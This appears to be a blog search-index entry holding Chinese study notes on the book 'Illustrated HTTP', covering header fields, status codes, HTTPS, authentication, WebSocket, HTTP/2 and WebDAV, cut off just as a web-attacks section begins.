[{"title":"1","url":"/2020/04/06/1/","content":"![Storyboard](Storyboard.png)"},{"title":"《图解 HTTP》知识点整理","url":"/2019/11/21/图解 HTTP 知识点记录/","content":"\n### Web 和网络基础\n1. 绝对 URI 的格式。\n\n   ```html\n   http://user:pass@www.example.com:80/dir/index.html?uid=1#ch1\n   ```\n\n   * `http://`：协议方案名\n   * `user:pass`：登录信息（认证）\n   * `www.example.com`：服务器地址\n   * `80`：端口号\n   * `/dir/index.html`：带层次的文件路径，也就是请求 URI\n   * `uid=1`：查询字符串\n   * `ch1`：片段标识符\n\n\n### HTTP 协议\n1. 请求报文的构成：\n   请求行分别为 方法、URI、协议版本\n\n   ```\n   POST /form/entry HTTP/1.1\n   ```\n\n   接下来是请求首部字段\n\n   ```\n   Host: hackr.jp\n   Connection: keep-alive\n   Content-Type: application/x-www-form-urlencoded\n   Content-Length: 16\n   ```\n\n   空一行分隔（CR+LF），内容实体\n\n   ```\n   name=ueno&age=37\n   ```\n\n2. 响应报文的构成：\n   状态行分别为 协议版本、状态码、状态码的原因短语\n\n   ```\n   HTTP/1.1 200 OK\n   ```\n\n   接下来是响应首部字段\n\n   ```\n   Date: Tue, 10 Jul 2012 06:50:15 GMT\n   Content-Length: 362\n   Content-Type: text/html\n   ```\n\n   空一行分隔（CR+LF），然后是内容主体\n\n   ```\n   <html>\n   ...\n   ```\n\n3. HTTP/1.1 中可使用的方法\n\n   1. **GET** : 获取资源。\n   2. **POST** : 传输实体主体。\n   3. **PUT** : 传输文件。不带检验机制。\n   4. **HEAD** : 获得报文首部。和 GET 一样，只是不返回主体，用于确认 URI 的有效性及资源更新的日期时间等\n   5. **DELETE** : 删除文件。与 PUT 相反。\n   6. **OPTIONS** : 询问支持的 HTTP 方法。\n   7. **TRACE** : 追踪路径，让 Web 服务器将之前的请求通信环回给客户端。\n   8. **CONNECT** : 要求用隧道协议连接代理。使用 SSL 和 TLS 协议加密通信内容后传输。\n\n   另外 **LINK** 和 **UNLINK** 方法在 HTTP/1.1 被废弃。\n\n5. HTTP /1.1 首部字段（47 种）一览：\n   1. 通用首部字段\n     \n      | 首部字段名        | 说明                       |\n      | ----------------- | -------------------------- |\n      | Cache-Control     | 控制缓存的行为             |\n      | Connection        | 逐跳首部、连接的管理       |\n      | Date              | 创建报文的日期时间         |\n      | Pragma            | 报文指令                   |\n      | Trailer           | 报文末端的首部一览         |\n      | Transfer-Encoding | 指定报文主体的传输编码方式 |\n      | Upgrade           | 升级为其他协议             |\n      | Via               | 代理服务器的相关信息       |\n      | Warning           | 错误通知                   |\n   \n   2. 请求首部字段\n   \n      | 首部字段名          | 说明                                            |\n      | ------------------- | ----------------------------------------------- |\n      | Accept              | 用户代理可处理的媒体类型                        |\n      | Accept-Charset      | 优先的字符集                                    |\n      | Accept-Encoding     | 优先的内容编码                                  |\n      | Accept-Language     | 优先的语言（自然语言）                          |\n      | Authorization       | Web 认证信息                                    |\n      | Expect              | 期待服务器的特定行为                            |\n      | From                | 用户的电子邮箱地址                              |\n      | Host                | 请求资源所在的服务器                            |\n      | If-Match            | 比较实体标记（ETag）                            |\n      | If-Modified-Since   | 比较资源的更新时间                              |\n      | If-Range            | 资源未更新时发送实体 Byte 的范围请求            |\n      | If-Unmodified-Since | 比较资源的更新时间（与 If-Modified-Since 相反） |\n      | Max-Forwards        | 最大传输逐跳数                                  |\n      | Proxy-Authorization | 代理服务器要求客户端的认证信息                  |\n      | Range               | 实体的字节请求范围                              |\n      | Referer             | 对请求中 URI 的原始获取方                       |\n      | TE                  | 传输编码的优先级                                |\n      | User-Agent          | HTTP 客户端程序的信息                           |\n   \n   3. 响应首部字段\n   \n      | 首部字段名         | 说明                         |\n      | ------------------ | ---------------------------- |\n      | Accept-Ranges      | 是否可接受字节的范围请求     |\n      | Age                | 推算资源创建经过的时间       |\n      | ETag               | 资源的匹配信息               |\n      | Location           | 令客户端重定向至指定 URI     |\n      | Proxy-Authenticate | 代理服务器对客户端的认证信息 |\n      | Retry-After        | 对再次发起请求的时机要求     |\n      | Server             | HTTP 服务器的安装信息        |\n      | Vary               | 代理服务器缓存的管理信息     |\n      | WWW-Authenticate   | 服务器对客户端的认证信息     |\n   \n   4. 实体首部字段\n   \n      | 首部字段名       | 说明                   |\n      | ---------------- | ---------------------- |\n      | Allow            | 资源可支持的 HTTP 方法 |\n      | Content-Encoding | 实体主体使用的编码方式 |\n      | Content-Language | 实体主体的自然语言     |\n      | Content-Length   | 实体主体的大小         |\n      | Content-Location | 替代对应的资源的 URI   |\n      | Content-MD5      | 实体主体的报文摘要     |\n      | Content-Range    | 实体主体的位置范围     |\n      | Expires          | 实体主体过期的日期时间 |\n      | Last-Modified    | 资源的最后修改日期时间 |\n   \n   ##### 注：还有其他 RFC 2616 外定义的首部字段，如 Cookie，Set-Cookie 和 Content-Disposition 等也是会经常用到。\n   \n6. End-to-end 首部和 Hop-by-hop 首部（是否缓存代理）\n\n   除以下 8 个首部字段之外，其他所有字段都属于端到端首部\n\n   *  **Connection**\n   * **Keep-Alive**\n   * **Proxy-Authenticate**\n   * **Proxy-Authorization**\n   * **Trailer**\n   * **TE**\n   * **Transfer-Encoding**\n   * **Upgrade**\n\n### HTTP /1.1 通用首部字段详解\n\n1. **Cache-Control** 控制缓存的行为，指令的参数是可选的，通过“,”分隔。\n\n   * 缓存请求指令\n\n     | 指令             | 参数   | 说明                         |\n     | ---------------- | ------ | ---------------------------- |\n     | no-cache         | 无     | 强制向源服务器再次验证       |\n     | no-store         | 无     | 不缓存请求或响应的任何内容   |\n     | max-age=[秒]     | 必需   | 响应的最大Age值              |\n     | max-stale(=[秒]) | 可省略 | 接收已过期的响应             |\n     | min-fresh=[秒]   | 必需   | 期望在指定时间内的响应仍有效 |\n     | no-transform     | 无     | 代理不可更改媒体类型         |\n     | only-if-cached   | 无     | 从缓存获取资源               |\n     | cache-extension  | -      | 新指令标记（token）          |\n\n   * 缓存响应指令\n\n     | 指令             | 参数   | 说明                                           |\n     | ---------------- | ------ | ---------------------------------------------- |\n     | public           | 无     | 可向任意方提供响应的缓存                       |\n     | private          | 可省略 | 仅向特定用户返回响应                           |\n     | no-cache         | 可省略 | 缓存前必须先确认其有效性                       |\n     | no-store         | 无     | 不缓存请求或响应的任何内容                     |\n     | no-transform     | 无     | 代理不可更改的媒体类型                         |\n     | must-revalidate  | 无     | 可缓存但必须再向源服务器进行确认               |\n     | proxy-revalidate | 无     | 要求中间缓存服务器对缓存的响应有效性再进行确认 |\n     | max-age = [秒]   | 必需   | 响应的最大Age值                                |\n     | s-maxage = [秒]  | 必需   | 公共缓存服务器响应的最大Age值                  |\n     | cache-extension  | -      | 新指令标记（token）                            |\n\n2. **Connection** 具备两个作用：\n\n   * 控制不再转发给代理的首部字段\n\n   * 管理持久连接：\n\n     HTTP /1.1 版本的默认连接都是持久连接（Keep-Alive），当服务端想明确断开连接时，指定其值为 Close。\n\n3. **Pragma** 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0 的向后兼容而定义。只用在客户端发送请求，要求所有的中间服务器不返回缓存的资源。形式唯一：`Pragma: no-cache`\n\n4. **Trailer** 会实现说明在报文主体后记录了哪些首部字段，可应用在 HTTP/1.1 版本分块传输编码时。\n\n5. **Transfer-Encoding** 规定了传输报文主体时采用的编码方式。\n\n6. **Upgrade** 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定 Connection:Upgrade。\n\n7. **Via** 是为了追踪客户端和服务器之间的请求和响应报文的传输路径，配合 TRACE 方法使用。\n\n8. **Warning** 会告知用户一些与缓存相关的问题和警告，格式如下：\n\n   `Warning: [警告码][警告的主机:端口号]\"[警告内容]\"([日期时间])`\n\n   HTTP /1.1 定义了 7 种警告码：\n\n   | 警告码 | 警告内容                                       | 说明                                                         |\n   | :----: | ---------------------------------------------- | ------------------------------------------------------------ |\n   |  110   | Response is stale (响应已过期)                 | 代理返回已过期的资源                                         |\n   |  111   | Revalidation failed (再验证失败)               | 代理再验证资源有效性时失败(服务 器无法到达等原因)            |\n   |  112   | Disconnection operation(断开连接操作)          | 代理与互联网连接被故意切断                                   |\n   |  113   | Heuristic expiration (试探性过期)              | 响应的使用期超过24小时(有效缓存 的设定时间大于24小时的情况下) |\n   |  199   | Miscellaneous warning (杂项警告)               | 任意的警告内容                                               |\n   |  214   | Transformation applied (使用了转换)            | 代理对内容编码或媒体类型等执行了 某些处理时                  |\n   |  299   | Miscellaneous persistent warning(持久杂项警告) | 任意的警告内容                                               |\n\n### HTTP /1.1 请求首部字段详解\n\n1. **Accept** 通知服务器用户代理能够处理的媒体类型及媒体类型的相对优先级。例如：\n\n   * 文本文件\n\n     text/html, text/plain, text/css ... \n\n     application/xhtml+xml, application/xml ... \n\n   * 图片文件\n      image/jpeg, image/gif, image/png ... \n\n   * 视频文件\n\n     video/mpeg, video/quicktime ...\n\n   * 应用程序使用的二进制文件\n\n     application/octet-stream, application/zip ...\n\n   若想要给显示的媒体类型增加优先级，则使用 `q=` 来额外表示权重值，用\";\"进行分隔，范围0~1，可精确到小数点后3位，1为最大值和默认值。\n\n2. **Accept-Charset** 通知服务器用户代理支持的字符集及其优先顺序。\n\n3. **Accept-Encoding** 告知服务器用户代理支持的内容编码及优先级顺序，常用编码有：\n\n   * gzip（GNU zip）\n   * compress（UNIX 系统的标准压缩）\n   * deflate（zlib）\n   * Identity（不进行编码）\n\n   权重也是采用 q 值表示优先级。也可以使用“*”作为通配符。\n\n4. **Accept-Language** 告知服务器用户代理能够处理的自然语言集。\n\n5. **Authorization** 用来告知服务器用户代理的认证信息。通常是在返回 401 状态码响应后，把首部字段 Authorization 加入请求中。\n\n6. **Expect** 客户端用来告知服务器期望出现的某种特定行为。服务器无理解客户端的期望而发生错误时，会返回 417 Expectation Failed。\n\n7. **From** 用来告知服务器使用用户代理的电子邮件地址，目的是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。\n\n8. **Host** 会告知服务器请求的资源所处的互联网主机名和端口号，是 HTTP /1.1 规范内唯一一个必须被包含在请求内的首部字段。\n\n9. **If-Match** 条件请求，指定条件为真时，才会执行请求。\n\n10. **If-Modified-Since** 如果在指定的日期时间后，资源发生了更新，服务器就会接受请求。\n\n11. **If-None-Match** 和 If-Match 作用相反。\n\n12. **If-Range** 若指定的字段值和请求资源的一致时，则作为范围请求处理。相当于 If-Match 和 Range 两次处理\n\n13. **If-Unmodified-Since** 和 If-Modified-Since 的作用相反。\n\n14. **Max-Forwards** 通过 TRACE 和 OPTIONS 方法，表示以十进制证书形式指定可经过的服务器最大数目，在往下一个服务器转发请求前会减 1 后重新赋值。\n\n15. **Proxy-Authorization** 告知服务器认证所需要的信息。\n\n16. **Range** 告知服务器资源的指定范围。\n\n17. **Referer** 告知服务器请求的原始资源的 URI。\n\n18. **TE** 告知服务器能够处理响应的传输编码方式及其优先级。与 Accept-Encoding 的功能很像，但是用于传输编码。\n\n19. **User-Agent** 会将创建请求的浏览器和用户代理名称等信息传达给服务器。\n\n### 响应首部字段\n\n1. **Accept-Ranges** 用来告知客户端服务器是否能处理范围请求。可处理时指定其为 bytes，反之为 none。\n2. **Age** 告知客户端源服务器在多久前创建了响应。字段值的单位为秒。\n3. **ETag** 能告知客户端实体标示。是一种可将资源以字符串形式做唯一性标识的方式。没有统一的算法规则，仅仅由服务器来分配。ETag 中有强 ETag 值和弱 ETag 值之分，强 ETag 值不论实体发生多么细微的变化都会改变其值；弱 ETag 值只用于提示资源是否相同，只有资源发生根本变化才会改变。弱 ETag 会在字符值最开始处附加 W/。\n4. **Location** 可以将响应接收方引导至某个与请求 URI 位置不同的资源，通常会配合 3xx 的响应。\n5. **Proxy-Authenticate** 会把由代理服务器所要求的认证信息发送给客户端。\n6. **Retry-After** 告知客户端应该在多久之后再次发送请求。主要配合 503 Service Unavailable 或 3xx 响应。\n7. **Server** 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。\n8. **Vary** 可对缓存进行控制，源服务器会向代理服务器传达关于本地缓存使用方法的命令。\n9. **WWW-Authenticate** 用于 HTTP 访问认证。会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或 Digest） 和带参数提示的质询（Challenge）。\n\n### 实体首部字段\n\n1. **Allow** 用于通知客户端能够支持的 Request-URI 指定资源的所有 HTTP 方法。当接收到不支持的 HTTP 方法时，会以状态码 405 Method Not Allowed 作为响应返回。\n2. **Content-Encoding** 会告知客户端服务器对实体的主体部分选用的内容编码方式。\n3. **Content-Language** 会告知客户端实体主体使用的自然语言。\n4. **Content-Length** 表明了实体主体部分的大小。对实体主体进行内容编码传输时，不能再使用。\n5. **Content-Location** 给出与报文主体部分相对应的 URI。\n6. **Content-MD5**  客户端会对接收的报文主体执行相同的 MD5 算法，然后与此字段值比较。对报文主体执行 MD5 算法获得的 128 位二进制数（32个字符），再通过 Base64 编码的借口就是此字段值。\n7. **Content-Range** 针对范围请求，告知客户端作为响应返回的实体和那个部分符合范围请求，单位字节。\n8. **Content-Type** 说明了实体主体内对象的媒体类型。\n9. **Expires** 会将资源失效的日期告知客户端。当首部的 Cache-Control 有 max-age 指令时会优先处理。\n10. **Last-Modified** 指明资源最终修改的时间。\n\n### 为 Cookie 服务的字段\n\n1. **Set-Cookie** 开始管理客户端的状态时，会事先告知使用的 Cookie 信息。\n\n   | 属性         | 说明                                                         |\n   | ------------ | ------------------------------------------------------------ |\n   | NAME=VALUE   | 赋予 Cookie 的名称和其值（必需项）                           |\n   | expires=DATE | Cookie 的有效期（若不指明则默认为浏览器关闭前为止）          |\n   | path=PATH    | 将服务器上的文件目录作为 Cookie 的使用对象（若不指定则默认为文档所在的文件目录） |\n   | domain=域名  | 作为 Cookie 使用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名） |\n   | Secure       | 仅在 HTTPS 安全通信时才会发送 Cookie                         |\n   | HttpOnly     | 加以限制，使 Cookie 不能被 JavaScript 脚本访问               |\n\n2. **Cookie** 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。\n\n### 其他字段\n\n1. **X-Frame-Options** 属于 HTTP 响应首部，控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。主要目的是为了防止点击劫持攻击。有以下两个可指定的字段值。\n\n   * **DENY**：拒绝\n\n   * **SAMEORIGIN**：仅同源域名下的页面匹配时许可。\n\n2. **X-XSS-Protection** 属于 HTTP 响应首部，针对跨站脚本攻击的一种对策，用于控制浏览器 XSS 防护机制的开关。可指定的值：\n\n   * **0** ：将 XSS 过滤设置成无效状态\n\n   * **1** ：将 XSS 过滤设置成有效状态\n\n3. **DNT** 属于 HTTP 请求首部，为 Do Not Track 的简称，意为拒绝个人信息被收集，是标示拒绝被精准广告追踪的一种方法。可指定的值：\n\n   * **0** ：同意被追踪\n\n   * **1** ：拒绝被追踪\n\n4. **P3P** 属于 HTTP 响应首部，通过利用 P3P (The Platform for Privacy Preferences，在线隐私偏好平台) 技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。需按以下操作步骤：\n\n   步骤 **1**：创建 P3P 隐私\n\n   步骤 **2**：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml\n\n   步骤 **3**：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应 中\n\n### HTTP 状态\n\n1. 状态码的类型：\n\n|      | 类别                             | 原因短语                   |\n| ---- | -------------------------------- | -------------------------- |\n| 1XX  | Informational（信息性状态码）    | 接收的请求正在处理         |\n| 2XX  | Success（成功状态码）            | 请求正常处理完毕           |\n| 3XX  | Redirection（重定向状态码）      | 需要进行附加操作以完成请求 |\n| 4XX  | Client Error（客户端错误状态码） | 服务器无法处理请求         |\n| 5XX  | Server Error（服务器错误状态码） | 服务器处理请求出错         |\n\n2. **2XX** 成功\n\n   1. **200 OK**：正常处理\n   2. **204 No Content**：已成功处理，但返回的响应报文中不含实体的主体部分。\n   3. **206 Partial Content** ：服务器成功执行了范围请求。\n\n3. **3XX** 重定向\n\n   1. **301 Moved Permanently**：永久性重定向\n   2. **302 Found**：临时性重定向，POST 会变成 GET\n   3. **303 See Other**：表示资源存在着另一个 URI，并希望客户端使用 GET 方式定向获取资源\n   4. **304 Not Modified**：客户端发送附带条件的请求，服务器端允许请求访问资源但未满足条件\n   5. **307 Temporary Redirect**：临时重定向，不会把 POST 变换成 GET\n\n   ##### 注：HTTP 1.1 中使用 303 和 307 来细化 302 重定向的行为。\n\n4. **4XX** 客户端错误\n\n   1. **400 Bad Request**：请求报文中存在语法错误\n   2. **401 Unauthorized**：表示发送请求需要有通过 HTTP 认证（浏览器弹窗输入密码）\n   3. **403 Forbidden**：请求资源的访问被服务器拒绝了\n   4. **404 Not Found**：服务器上无法找到请求的资源（或者拒绝请求且不想说明原因）\n\n5. **5XX** 服务器错误\n\n   1. **500 Internal Server Error**：服务端在执行请求时发生错误\n   2. **503 Service Unavailable**：服务器暂时处于超负荷或正在进行停机维，无法处理请求\n\n### HTTPS\n\n1. HTTP 的缺点：\n\n   * 通信使用明文（不加密），内容可能会被窃听。（内容泄漏）\n   * 不验证通信方的身份，因此有可能遭遇伪装。（Dos 攻击）\n   * 无法验证报文的完整性，所以有可能已遭篡改。（MITM 攻击）\n\n   即：HTTP + 加密 + 认证 + 完整性保护 = HTTPS\n\n2. SSL\n\n   * SSL 是独立于 HTTP 的协议，使用 SSL 时，先和 SSL 通信，再由 SSL 和 TCP 通信。\n   * SSL 采用公开密钥加密的非对称加密处理方式，发送方使用公钥进行加密，接收方使用私钥进行解密。\n   * EV SSL 证书可确认对方服务器背后运营的企业是否真实存在。\n   * 使用 OpenSSL 的开源程序，可以构建一套属于自己的认证机构，给自己的服务器颁发证书。浏览器访问时，会显示无法确认连接安全性等警告消息。\n   * HTTPS 比 HTTP 慢 2 到 100 倍，SSL 的慢一种是通信慢，另一种是指由于大量消耗 CPU 等资源导致处理速度变慢。\n\n3. HTTPS 工作流程\n\n   1. 客户端通过发送 `Client Hello` 报文开始 SSL 通信。报文中包 含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。\n   2. 服务器可进行 SSL 通信时，会以 `Server Hello` 报文作为应答。\n   3. 之后服务器发送 `Certificate` 报文。报文中包含公开密钥证书。\n   4. 服务器发送 `Server Hello Done` 报文通知客户端，最初阶段的 SSL 握手协商部分结束。\n   5. SSL 第一次握手结束之后，客户端以 `Client Key Exchange` 报文作为回应。报文中包含通信加密中使用的一种被称为 `Pre-master secret` 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。\n   6. 接着客户端继续发送 `Change Cipher Spec` 报文。\n   7. 客户端发送 `Finished` 报文。该报文包含连接至今全部报文的整体校验值。\n   8. 服务器同样发送 `Change Cipher Spec` 报文。\n   9. 服务器同样发送 `Finished` 报文。\n   10. 服务器和客户端的 `Finished` 报文交换完毕之后，SSL 连接就算建立完成。\n   11. 应用层协议通信，即发送 HTTP 响应。\n   12. 最后由客户端断开连接。断开连接时，发送 `close_notify` 报文。\n\n   在以上流程中，应用层发送数据时会附加一种叫做 MAC(Message Authentication Code)的报文摘要。MAC 能够查知报文是否遭到篡 改，从而保护报文的完整性。\n\n### HTTP/1.1 使用的认证方式\n\n* BASIC 认证（基本认证）：\n\n  1. 当请求的资源需要认证时，服务器会随状态码 **401 Authorization Required**，返回带 **WWW-Authenticate** 首部字段的响应。该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串 (realm)。\n  2. 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户信息发送给服务器，信息中间以冒号(:)连接后，再经过 Base64 编码处理。\n  3. 接收到包含首部字段 **Authorization** 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。\n\n  BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理，不需要任何附加信息即可对其解码。如果被人窃听，被盗的可能性极高。\n\n* DIGEST 认证（摘要认证）：\n\n  1. 和 BASIC 认证一样，**WWW-Authenticate** 字段内包含质问响应方式认证所需的临时质询码（随机数， nonce）和 realm。\n  2. 接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信息。必须包含 username、realm、nonce、uri 和 response 的字段信息。\n  3. 接收到包含首部字段 **Authorization** 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。并且这时会在首部字段 **Authentication-Info** 写入一些认证成功的相关信息。\n\n* SSL 客户端认证\n\n  1. 接收到需要认证资源的请求，服务器会发送 `Certificate Request` 报文，要求客户端提供客户端证书。\n  2. 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 `Client Certificate` 报文方式发送给服务器。\n  3. 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。\n\n* FormBase 认证（基于表单认证）\n\n  基于表单的认证方法并不是在 HTTP 协议中定义的，客户端会向服务器上的 Web 应用程序发送登录信息(Credential)，按登录信息的验证结果认证。（也就是常见的输入账号密码登录）\n\n  基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话），以弥补 HTTP 协议中不存在的状态管理功能。具体流程如下：\n\n  1. 客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送。\n  2. 服务器会发放用以识别用户的 Session ID，并通过首部字段 **Set-Cookie** 告知客户端写入 Cookie。\n  3. 客户端在下次向服务器发送请求时会自动带上 Cookie 中的 Session ID，服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。\n\n### HTTP 的功能追加协议\n\n1. **SPDY**\n\n   * 频繁的进行 HTTP 请求会有以下瓶颈：\n     * 一条连接上只可发送一个请求。\n     * 请求只能从客户端开始。客户端不可以接收除响应以外的指令。\n     * 请求 **/** 响应首部未经压缩就发送。首部信息越多延迟越大。\n     * 发送冗长的首部。每次互相发送相同的首部造成的浪费较多。\n     * 可任意选择数据压缩格式。非强制压缩发送。\n   * 基于 HTTP 的解决方案：\n     * Ajax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML 技术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文档对象模型）的操作，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。然而，利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。\n     * Comet 的解决方法：一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客 户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端 推送(Server Push)的功能。内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet 也仍未解决 HTTP 协议本身存在的问题。\n   * SPDY 在协议级别消除 HTTP 的瓶颈，没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与传输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。使用 SPDY 后，HTTP 协议额外获得以下功能：\n     * **多路复用流**，通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。\n     * **赋予请求优先级**，解决因带宽低而导致响应变慢的问题。\n     * **压缩 HTTP 首部**，减少数据包数量和发送的字节数。\n     * **推送功能**，服务器主动向客户端推送数据。\n     * **服务器提示功能**，服务器可以主动提示客户端请求所需的资源，在资源已缓存时可以避免发送不必要请求。\n\n2. **WebSocket** 全双工通信\n\n   * WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送 JSON、XML、HTML 或图片等任意格式的数据。WebSocket 协议的主要特点：\n     * **推送功能**，支持由服务器向客户端推送数据的功能。\n     * **减少通信量**，和 HTTP 相比，不但每次连接时的总开销减少，首部信息很小所以通信量也相应减少了。\n\n   * 为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一次“握手”的步骤。\n\n     * 握手 · 请求\n\n       为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变，以达到握手的目的。\n\n       ```\n       GET /chat HTTP/1.1\n       Host: server.example.com\n       Upgrade: websocket\n       Connection: Upgrade\n       Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== \n       Origin: http://example.com \n       Sec-WebSocket-Protocol: chat, superchat \n       Sec-WebSocket-Version: 13\n       ```\n\n       **Sec-WebSocket-Key** 字段内记录着握手过程中必不可少的键值。\n\n       **Sec-WebSocket-Protocol** 字段内记录使用的子协议。\n\n     * 握手 · 响应\n\n       对于之前的请求，返回状态码 **101 Switching Protocols** 的响应。\n\n       ```\n       HTTP/1.1 101 Switching Protocols\n       Upgrade: websocket\n       Connection: Upgrade\n       Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= \n       Sec-WebSocket-Protocol: chat\n       ```\n\n       **Sec-WebSocket-Accept** 的字段值是由握手请求中的 **Sec-WebSocket-Key** 的字段值生成的。\n\n       成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。\n\n   * **WebSocket API**\n\n     JavaScript 可调用由 W3C 标准制定的 [The WebSocket API](http://www.w3.org/TR/websockets/) 内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。\n\n     ```javascript\n     var socket = new WebSocket('ws://game.example.com:12010/updates');\n     socket.onopen = function () {\n     \tsetInterval(function() {\n       \tif (socket.bufferedAmount == 0)\n       \t\tsocket.send(getUpdateData()); \n       }, 50);\n     };\n     ```\n\n3. **HTTP/2.0**\n\n   * HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验，通过以下协议为基础实现：\n     * **SPDY**\n     * **HTTP Speed** + **Mobility** 由微软公司起草，是用于改善并提高移动端通信时的通信速度和性能的标准，建立在 Google 公司提出的 SPDY 与 WebSocket 的基础之上。\n     * **Network-Friendly HTTP Upgrade** 主要是在移动端通信时改善 HTTP 性能的标准。\n\n   * HTTP/2.0 的 7 项技术及其讨论\n\n     | 技术                  | 基础协议                   |\n     | --------------------- | -------------------------- |\n     | 压缩                  | SPDY、Friendly             |\n     | 多路复用              | SPDY                       |\n     | TLS 义务化            | Speed + Mobility           |\n     | 协商                  | Speed + Mobility、Friendly |\n     | 客户端拉拽/服务器推送 | Speed + Mobility           |\n     | 流量控制              | SPDY                       |\n     | WebSocket             | Speed + Mobility           |\n\n     \n\n4. **WebDAV** Web 服务器文件管理\n\n   * WebDAV（Web-based Distributed Authoring and Versioning，基于万维网 的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进 行文件复制、编辑等操作的分布式文件系统。\n\n   * 除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编 辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的 版本控制功能。\n   * 针对服务器上的资源，WebDAV 新增加了一些概念：\n     * 集合(**Collection**)：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。\n     * 资源(**Resource**)：把文件或集合称为资源。 \n     * 属性(**Property**)：定义资源的属性。定义以**“**名称 **=** 值**”**的格式执行。\n     * 锁(**Lock**)：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。\n   * WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。\n     * **PROPFIND** ：获取属性\n     * **PROPPATCH** ：修改属性\n     * **MKCOL** ：创建集合\n     * **COPY** ：复制资源及属性\n     * **MOVE** ：移动资源\n     * **LOCK** ：资源加锁\n     * **UNLOCK** ：资源解锁\n   * 为配合扩展的方法，状态码也随之扩展。\n     * **102 Processing** ：可正常处理请求，但目前是处理中状态\n     * **207 Multi-Status** ：存在多种状态\n     * **422 Unprocessible Entity** ：格式正确，内容有误\n     * **423 Locked** ：资源已被加锁\n     * **424 Failed Dependency** ：处理与某请求关联的请求失败，因此不再维持依赖关系\n     * **507 Insufficient Storage** ：保存空间不足\n\n### 构建 Web 内容的技术\n\n1. **HTML** 是为了发送 Web 上的超文本 (Hypertext) 而开发的标记语言。\n   * HTML5 标准不仅解决了浏览器之间的兼容性问题，并且可把文本作为数据对待，更容易复用，动画等效果也变得更生动。\n   * CSS 可以指定如何展现 HTML 内的各种元素，属于样式表标准之一。\n2. **动态 HTML** 是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。\n   * DOM 是用以操作 HTML 文档和 XML 文档的 API(Application Programming Interface，应用编程接口)。\n   * 通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的方式控制 HTML 的改变。\n3. **Web 应用** 是指通过 Web 功能提供的应用程序。\n   * 其作用于由程序创建的动态内容之上。\n   * CGI (Common Gateway Interface，通用网关接口) 是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。每次接到请求都要跟着启动一次，一旦访问量过大，Web 服务器要承担相当大的负载。\n   * Servlet 是一种能在服务器上创建动态内容的程序，常驻内存，执行效率高，解决 CGI 问题。\n4. 数据发布的格式及语言\n   * XML (eXtensible Markup Language，可扩展标记语言) 是一种可按应用目标进行扩展的通用标记语言。\n   * RSS (简易信息聚合，也叫聚合内容) 和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。\n   * JSON (JavaScript Object Notation) 是一种以 JavaScript (ECMAScript) 的对象表示法为基础的轻量级数据标记语 言。\n\n### Web 攻击技术\n\n1. **针对 Web 的攻击技术**\n\n   * 在 HTTP 请求报文内加载攻击代码，就能发起对 Web 